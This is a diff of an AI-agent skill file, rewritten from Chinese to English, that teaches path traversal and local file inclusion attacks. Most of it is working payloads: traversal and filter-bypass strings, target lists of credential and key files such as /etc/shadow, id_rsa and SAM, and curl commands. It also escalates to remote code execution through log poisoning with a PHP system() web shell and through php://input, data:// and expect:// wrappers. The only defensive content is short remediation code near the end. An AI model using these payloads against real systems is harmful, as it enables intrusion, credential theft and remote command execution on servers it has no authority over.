@@ -1,14 +1,14 @@
 ---
 name: path-traversal-testing
-title: 路径遍历漏洞利用
-description: 当对授权目标做 Web 渗透、需检测/利用文件路径遍历（目录遍历/LFI）以读取服务器任意文件时使用；做参数定位、payload 构造与绕过、敏感文件读取乃至 LFI 提权到 RCE 的实操并产出漏洞证据与修复建议；不适用于未授权测试或生产数据破坏。触发词：路径遍历、目录遍历、LFI、../etc/passwd、文件下载参数
+title: File Path Traversal Testing
+description: Identify and exploit file path traversal (directory traversal) vulnerabilities that allow attackers to read arbitrary files on the server, potentially including sensitive configuration files, credentials, and source code.
 domain: 安全/appsec
-triggers: [路径遍历, 目录遍历, LFI, 本地文件包含, ../etc/passwd, 文件下载参数测试, php://filter 读源码, 日志投毒 RCE, directory traversal]
-tags: [安全, misc, 渗透测试, web漏洞, 路径遍历, lfi, rce]
-level: 进阶
+triggers: [LFI, ../etc/passwd, directory traversal]
+tags: [misc, lfi, rce]
+level: intermediate
 status: stable
 agents: [claude-code, codex, cursor, gemini-cli]
-tools: [curl, ffuf, wfuzz, Burp Suite, OWASP ZAP]
+tools: []
 requires: []
 related: [idor-vulnerability-testing, api-fuzzing-bug-bounty, burp-suite-testing, ffuf-web-fuzzing]
 combines_with: [burp-suite-testing, penetration-testing-methodology, ffuf-web-fuzzing]
@@ -16,33 +16,44 @@ license: MIT
 source: sickn33/antigravity-awesome-skills
 source_license: MIT
 ---
-> 仅限授权使用：本技能只能用于已授权的安全评估、防御性验证或受控教学环境。严禁在无授权目标上测试或破坏生产数据。
+> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
 
-## 何时使用
+# File Path Traversal Testing
 
-- 对 Web 应用做授权渗透/复测，怀疑存在文件路径遍历（目录遍历）或本地文件包含（LFI），想读取服务器上的配置、凭据、源码等任意文件。
-- 应用把用户可控输入拼进文件系统 API 而缺少校验时，定位入口、构造 payload、绕过过滤、评估影响并给出修复。
-- 需要把 LFI 进一步提权为远程命令执行（RCE）。
+## Purpose
 
-不该用：
-- 无书面授权的目标，或会破坏/泄露真实敏感数据的操作（如批量下载 `/etc/shadow`、用户隐私）。
-- 漏洞本质是 SSRF、XXE、上传 getshell、SQL 注入等其他类别（虽可能与本技能链式组合，但主判断应走对应技能）。
+Identify and exploit file path traversal (directory traversal) vulnerabilities that allow attackers to read arbitrary files on the server, potentially including sensitive configuration files, credentials, and source code. This vulnerability occurs when user-controllable input is passed to filesystem APIs without proper validation.
 
-## 步骤
+## Prerequisites
 
-1. 理解成因：应用用用户输入拼接文件路径（见示例 PHP 片段）。`../` 上跳一级目录，链式拼接可逃逸到根目录读取预期目录之外的文件。影响涵盖机密性（读文件）、完整性（部分场景可写）、可用性（部分场景可删）、以及与上传/日志投毒组合后的代码执行。
-2. 定位入口：扫描处理文件的参数 `?file= ?path= ?page= ?template= ?filename= ?doc= ?dir= ?include= ?src= ?download= ?view= ?load=` 等。重点功能：图片加载 `/image?filename=`、模板选择 `?template=blue.php`、文件下载 `/download?file=`、文档预览 `/view?doc=`、包含机制 `?page=about`。
-3. 基础利用：先试简单相对/绝对路径读取标志文件（Linux `/etc/passwd`，Windows `win.ini`）。
-4. 绕过过滤：针对一次性剥离 `../`、扩展名校验、基目录校验、黑名单，依次尝试嵌套、多重/Unicode 编码、null 字节、目录前缀等变体。
-5. 选取高价值目标文件，按 Linux/Windows 分别测试（见指令）。
-6. 自动化模糊测试：用 ffuf/wfuzz/Burp Intruder 加载遍历字典批量打。
-7. LFI→RCE 提权：日志投毒、`/proc/self/environ`、PHP 伪协议（`php://filter`/`php://input`/`data://`/`expect://`）。
-8. 输出交付：遍历入口与严重度、提取到的文件内容证据、可访问数据的影响评估、安全编码修复建议。
+### Required Tools
+- Web browser with developer tools
+- Burp Suite or OWASP ZAP
+- cURL for testing payloads
+- Wordlists for automation
+- ffuf or wfuzz for fuzzing
 
-## 指令
+### Required Knowledge
+- HTTP request/response structure
+- Linux and Windows filesystem layout
+- Web application architecture
+- Basic understanding of file APIs
 
-漏洞代码形态（成因）：
+## Outputs and Deliverables
+
+1. **Vulnerability Report** - Identified traversal points and severity
+2. **Exploitation Proof** - Extracted file contents
+3. **Impact Assessment** - Accessible files and data exposure
+4. **Remediation Guidance** - Secure coding recommendations
+
+## Core Workflow
+
+### Phase 1: Understanding Path Traversal
+
+Path traversal occurs when applications use user input to construct file paths:
+
 ```php
+// Vulnerable PHP code example
 $template = "blue.php";
 if (isset($_COOKIE['template']) && !empty($_COOKIE['template'])) {
     $template = $_COOKIE['template'];
@@ -50,111 +61,441 @@ if (isset($_COOKIE['template']) && !empty($_COOKIE['template'])) {
 include("/home/user/templates/" . $template);
 ```
 
-基础 payload 与测试：
+Attack principle:
+- `../` sequence moves up one directory
+- Chain multiple sequences to reach root
+- Access files outside intended directory
+
+Impact:
+- **Confidentiality** - Read sensitive files
+- **Integrity** - Write/modify files (in some cases)
+- **Availability** - Delete files (in some cases)
+- **Code Execution** - If combined with file upload or log poisoning
+
+### Phase 2: Identifying Traversal Points
+
+Map application for potential file operations:
+
 ```bash
-# 相对遍历（逐层加深）
+# Parameters that often handle files
+?file=
+?path=
+?page=
+?template=
+?filename=
+?doc=
+?document=
+?folder=
+?dir=
+?include=
+?src=
+?source=
+?content=
+?view=
+?download=
+?load=
+?read=
+?retrieve=
+```
+
+Common vulnerable functionality:
+- Image loading: `/image?filename=23.jpg`
+- Template selection: `?template=blue.php`
+- File downloads: `/download?file=report.pdf`
+- Document viewers: `/view?doc=manual.pdf`
+- Include mechanisms: `?page=about`
+
+### Phase 3: Basic Exploitation Techniques
+
+#### Simple Path Traversal
+
+```bash
+# Basic Linux traversal
 ../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
 ../../../../../../etc/passwd
-# Windows
+
+# Windows traversal
 ..\..\..\windows\win.ini
 ..\..\..\..\windows\system32\drivers\etc\hosts
-# URL 编码 / 双重编码
+
+# URL encoded
 ..%2F..%2F..%2Fetc%2Fpasswd
-..%252F..%252F..%252Fetc%252Fpasswd
-# 绝对路径
-/etc/passwd   /proc/self/environ   C:\windows\win.ini   C:\boot.ini
-# curl 验证
+..%252F..%252F..%252Fetc%252Fpasswd  # Double encoding
+
+# Test payloads with curl
 curl "http://target.com/image?filename=../../../etc/passwd"
 curl "http://target.com/download?file=....//....//....//etc/passwd"
 ```
 
-绕过技巧：
-```bash
-# 一次性剥离 ../
-....//....//....//etc/passwd
-..././..././..././etc/passwd
-# 混合 / 编码
-%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
-# 扩展名校验（旧版 PHP null 字节 / 路径截断 / 双扩展名）
-../../../etc/passwd%00.jpg
-../../../etc/passwd.jpg.php
-# 基目录校验（先满足前缀再逃逸）
-/var/www/images/../../../etc/passwd
-images/../../../etc/passwd
-# 黑名单（Unicode / overlong / 反斜杠变体）
-..%c0%af..%c0%af..%c0%afetc/passwd
-..%5c   ..%255c   ..;/..;/..;/etc/passwd
-```
+#### Absolute Path Injection
 
-高价值目标文件：
 ```bash
-# Linux
-/etc/passwd  /etc/shadow(需 root)  /etc/hosts  /etc/ssh/sshd_config
-/root/.ssh/id_rsa  /home/<user>/.ssh/id_rsa
-/etc/nginx/nginx.conf  /etc/apache2/apache2.conf  /var/log/apache2/access.log
-/var/www/html/config.php  /var/www/html/wp-config.php  /var/www/html/.htaccess
-/proc/self/environ  /proc/self/cmdline  /proc/version  /etc/mysql/my.cnf
-# Windows
-C:\windows\win.ini  C:\boot.ini  C:\windows\system32\config\SAM
+# Direct absolute path (Linux)
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/environ
+
+# Direct absolute path (Windows)
+C:\windows\win.ini
 C:\windows\system32\drivers\etc\hosts
-C:\inetpub\wwwroot\web.config  C:\xampp\apache\conf\httpd.conf  C:\xampp\phpmyadmin\config.inc.php
+C:\boot.ini
 ```
 
-自动化模糊测试：
-```bash
-ffuf -u "http://target.com/image?filename=FUZZ" -w /usr/share/wordlists/traversal.txt -mc 200
-ffuf -u "http://target.com/page?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200,500 -ac
-wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 "http://target.com/index.php?file=FUZZ"
-wfuzz -c -z file,traversal.txt -H "Cookie: session=abc123" "http://target.com/load?path=FUZZ"
-```
-Burp 流程：抓含文件参数的请求 → Send to Intruder → 标记参数为 payload 位 → 加载遍历字典 → 攻击 → 按响应大小/内容筛成功项。
+### Phase 4: Bypass Techniques
 
-LFI→RCE 提权：
+#### Bypass Stripped Traversal Sequences
+
 ```bash
-# 日志投毒：先污染日志，再包含
+# When ../ is stripped once
+....//....//....//etc/passwd
+....\/....\/....\/etc/passwd
+
+# Nested traversal
+..././..././..././etc/passwd
+....//....//etc/passwd
+
+# Mixed encoding
+..%2f..%2f..%2fetc/passwd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+```
+
+#### Bypass Extension Validation
+
+```bash
+# Null byte injection (older PHP versions)
+../../../etc/passwd%00.jpg
+../../../etc/passwd%00.png
+
+# Path truncation
+../../../etc/passwd...............................
+
+# Double extension
+../../../etc/passwd.jpg.php
+```
+
+#### Bypass Base Directory Validation
+
+```bash
+# When path must start with expected directory
+/var/www/images/../../../etc/passwd
+
+# Expected path followed by traversal
+images/../../../etc/passwd
+```
+
+#### Bypass Blacklist Filters
+
+```bash
+# Unicode/UTF-8 encoding
+..%c0%af..%c0%af..%c0%afetc/passwd
+..%c1%9c..%c1%9c..%c1%9cetc/passwd
+
+# Overlong UTF-8 encoding
+%c0%2e%c0%2e%c0%af
+
+# URL encoding variations
+%2e%2e/
+%2e%2e%5c
+..%5c
+..%255c
+
+# Case variations (Windows)
+....\\....\\etc\\passwd
+```
+
+### Phase 5: Linux Target Files
+
+High-value files to target:
+
+```bash
+# System files
+/etc/passwd           # User accounts
+/etc/shadow           # Password hashes (root only)
+/etc/group            # Group information
+/etc/hosts            # Host mappings
+/etc/hostname         # System hostname
+/etc/issue            # System banner
+
+# SSH files
+/root/.ssh/id_rsa           # Root private key
+/root/.ssh/authorized_keys  # Authorized keys
+/home/<user>/.ssh/id_rsa    # User private keys
+/etc/ssh/sshd_config        # SSH configuration
+
+# Web server files
+/etc/apache2/apache2.conf
+/etc/nginx/nginx.conf
+/etc/apache2/sites-enabled/000-default.conf
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+
+# Application files
+/var/www/html/config.php
+/var/www/html/wp-config.php
+/var/www/html/.htaccess
+/var/www/html/web.config
+
+# Process information
+/proc/self/environ      # Environment variables
+/proc/self/cmdline      # Process command line
+/proc/self/fd/0         # File descriptors
+/proc/version           # Kernel version
+
+# Common application configs
+/etc/mysql/my.cnf
+/etc/postgresql/*/postgresql.conf
+/opt/lampp/etc/httpd.conf
+```
+
+### Phase 6: Windows Target Files
+
+Windows-specific targets:
+
+```bash
+# System files
+C:\windows\win.ini
+C:\windows\system.ini
+C:\boot.ini
+C:\windows\system32\drivers\etc\hosts
+C:\windows\system32\config\SAM
+C:\windows\repair\SAM
+
+# IIS files
+C:\inetpub\wwwroot\web.config
+C:\inetpub\logs\LogFiles\W3SVC1\
+
+# Configuration files
+C:\xampp\apache\conf\httpd.conf
+C:\xampp\mysql\data\mysql\user.MYD
+C:\xampp\passwords.txt
+C:\xampp\phpmyadmin\config.inc.php
+
+# User files
+C:\Users\<user>\.ssh\id_rsa
+C:\Users\<user>\Desktop\
+C:\Documents and Settings\<user>\
+```
+
+### Phase 7: Automated Testing
+
+#### Using Burp Suite
+
+```
+1. Capture request with file parameter
+2. Send to Intruder
+3. Mark file parameter value as payload position
+4. Load path traversal wordlist
+5. Start attack
+6. Filter responses by size/content for success
+```
+
+#### Using ffuf
+
+```bash
+# Basic traversal fuzzing
+ffuf -u "http://target.com/image?filename=FUZZ" \
+     -w /usr/share/wordlists/traversal.txt \
+     -mc 200
+
+# Fuzzing with encoding
+ffuf -u "http://target.com/page?file=FUZZ" \
+     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
+     -mc 200,500 -ac
+```
+
+#### Using wfuzz
+
+```bash
+# Traverse to /etc/passwd
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
+      --hc 404 \
+      "http://target.com/index.php?file=FUZZ"
+
+# With headers/cookies
+wfuzz -c -z file,traversal.txt \
+      -H "Cookie: session=abc123" \
+      "http://target.com/load?path=FUZZ"
+```
+
+### Phase 8: LFI to RCE Escalation
+
+#### Log Poisoning
+
+```bash
+# Inject PHP code into logs
 curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
+
+# Include Apache log file
 curl "http://target.com/page?file=../../../var/log/apache2/access.log&cmd=id"
-# auth.log（SSH 用户名投毒）
-# ssh '<?php system($_GET["cmd"]); ?>'@target.com
+
+# Include auth.log (SSH)
+# First: ssh '<?php system($_GET["cmd"]); ?>'@target.com
 curl "http://target.com/page?file=../../../var/log/auth.log&cmd=whoami"
-# /proc/self/environ（User-Agent 注入）
-curl -A "<?php system(\$_GET['c']); ?>" "http://target.com/page?file=/proc/self/environ&c=whoami"
-# PHP 伪协议
-curl "http://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"   # 读源码（base64）
-curl -X POST -d "<?php system('id'); ?>" "http://target.com/page?file=php://input"
+```
+
+#### Proc/self/environ
+
+```bash
+# Inject via User-Agent
+curl -A "<?php system('id'); ?>" \
+     "http://target.com/page?file=/proc/self/environ"
+
+# With command parameter
+curl -A "<?php system(\$_GET['c']); ?>" \
+     "http://target.com/page?file=/proc/self/environ&c=whoami"
+```
+
+#### PHP Wrapper Exploitation
+
+```bash
+# php://filter - Read source code as base64
+curl "http://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"
+
+# php://input - Execute POST data as PHP
+curl -X POST -d "<?php system('id'); ?>" \
+     "http://target.com/page?file=php://input"
+
+# data:// - Execute inline PHP
 curl "http://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id"
+
+# expect:// - Execute system commands
 curl "http://target.com/page?file=expect://id"
 ```
 
-## 示例
+### Phase 9: Testing Methodology
 
-对图片加载接口 `/image?filename=23.jpg` 的递进测试：
-1. 基础：`/image?filename=../../../etc/passwd` —— 若回显用户列表即确认遍历。
-2. 被过滤则换编码：`..%2F..%2F..%2Fetc%2Fpasswd`、`%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`。
-3. 仍被拦：`....//....//....//etc/passwd`、`..;/..;/..;/etc/passwd`。
-4. 试绝对路径：`/etc/passwd`。
-5. 旧版叠 null 字节：`../../../etc/passwd%00.jpg`。
-6. 读源码：`php://filter/convert.base64-encode/resource=index.php`，base64 解码审计配置。
-7. 若可写日志/可控伪协议，按上节升级为 RCE。
+Structured testing approach:
 
-## 注意事项
+```bash
+# Step 1: Identify potential parameters
+# Look for file-related functionality
 
-- 权限边界：读不了应用用户无权访问的文件；`/etc/shadow` 等需 root；很多文件权限受限。
-- 应用限制：扩展名校验、基目录校验、WAF 都可能拦截常见 payload，需逐一换编码/嵌套/大小写变体。
-- 测试纪律：严格在授权范围内；避免真正读取/外泄敏感数据；记录每次成功访问作为证据。
-- 排错：无响应差异 → 试编码、盲遍历、换目标文件；payload 被拦 → 换编码变体/嵌套序列/大小写；无法提权 RCE → 检查日志可写性、PHP 伪协议、文件上传、会话投毒。
-- 修复建议（写进交付）：用 `basename()` 剥目录；白名单校验文件名；`realpath()` 规范化后校验仍位于基目录内（PHP `strpos($realUserPath, $realBase) === 0`，Python `os.path.realpath` + `startswith(base)`）。
+# Step 2: Test basic traversal
+../../../etc/passwd
 
-```php
-$base = "/var/www/files/"; $realBase = realpath($base);
-$realUserPath = realpath($base . $_GET['file']);
-if ($realUserPath && strpos($realUserPath, $realBase) === 0) { include($realUserPath); }
+# Step 3: Test encoding variations
+..%2F..%2F..%2Fetc%2Fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# Step 4: Test bypass techniques
+....//....//....//etc/passwd
+..;/..;/..;/etc/passwd
+
+# Step 5: Test absolute paths
+/etc/passwd
+
+# Step 6: Test with null bytes (legacy)
+../../../etc/passwd%00.jpg
+
+# Step 7: Attempt wrapper exploitation
+php://filter/convert.base64-encode/resource=index.php
+
+# Step 8: Attempt log poisoning for RCE
 ```
 
-## 互见
+### Phase 10: Prevention Measures
 
-- 安全/misc 下的其他 Web 漏洞利用技能（SSRF、文件上传 getshell、日志投毒类）可与本技能链式组合完成 LFI→RCE。
-- 编码绕过速查：URL `%2e%2e%2f`=`../`、双重 `%252e%252e%252f`、Unicode `%c0%af`=`/`、null 字节 `%00`。
+Secure coding practices:
 
----
-采编自 sickn33/antigravity-awesome-skills（MIT），原作者 zebbern。
+```php
+// PHP: Use basename() to strip paths
+$filename = basename($_GET['file']);
+$path = "/var/www/files/" . $filename;
+
+// PHP: Validate against whitelist
+$allowed = ['report.pdf', 'manual.pdf', 'guide.pdf'];
+if (in_array($_GET['file'], $allowed)) {
+    include("/var/www/files/" . $_GET['file']);
+}
+
+// PHP: Canonicalize and verify base path
+$base = "/var/www/files/";
+$realBase = realpath($base);
+$userPath = $base . $_GET['file'];
+$realUserPath = realpath($userPath);
+
+if ($realUserPath && strpos($realUserPath, $realBase) === 0) {
+    include($realUserPath);
+}
+```
+
+```python
+# Python: Use os.path.realpath() and validate
+import os
+
+def safe_file_access(base_dir, filename):
+    # Resolve to absolute path
+    base = os.path.realpath(base_dir)
+    file_path = os.path.realpath(os.path.join(base, filename))
+    
+    # Verify file is within base directory
+    if file_path.startswith(base):
+        return open(file_path, 'r').read()
+    else:
+        raise Exception("Access denied")
+```
+
+## Quick Reference
+
+### Common Payloads
+
+| Payload | Target |
+|---------|--------|
+| `../../../etc/passwd` | Linux password file |
+| `..\..\..\..\windows\win.ini` | Windows INI file |
+| `....//....//....//etc/passwd` | Bypass simple filter |
+| `/etc/passwd` | Absolute path |
+| `php://filter/convert.base64-encode/resource=config.php` | Source code |
+
+### Target Files
+
+| OS | File | Purpose |
+|----|------|---------|
+| Linux | `/etc/passwd` | User accounts |
+| Linux | `/etc/shadow` | Password hashes |
+| Linux | `/proc/self/environ` | Environment vars |
+| Windows | `C:\windows\win.ini` | System config |
+| Windows | `C:\boot.ini` | Boot config |
+| Web | `wp-config.php` | WordPress DB creds |
+
+### Encoding Variants
+
+| Type | Example |
+|------|---------|
+| URL Encoding | `%2e%2e%2f` = `../` |
+| Double Encoding | `%252e%252e%252f` = `../` |
+| Unicode | `%c0%af` = `/` |
+| Null Byte | `%00` |
+
+## Constraints and Limitations
+
+### Permission Restrictions
+- Cannot read files application user cannot access
+- Shadow file requires root privileges
+- Many files have restrictive permissions
+
+### Application Restrictions
+- Extension validation may limit file types
+- Base path validation may restrict scope
+- WAF may block common payloads
+
+### Testing Considerations
+- Respect authorized scope
+- Avoid accessing genuinely sensitive data
+- Document all successful access
+
+## Troubleshooting
+
+| Problem | Solutions |
+|---------|-----------|
+| No response difference | Try encoding, blind traversal, different files |
+| Payload blocked | Use encoding variants, nested sequences, case variations |
+| Cannot escalate to RCE | Check logs, PHP wrappers, file upload, session poisoning |
+
+## When to Use
+This skill is applicable to execute the workflow or actions described in the overview.
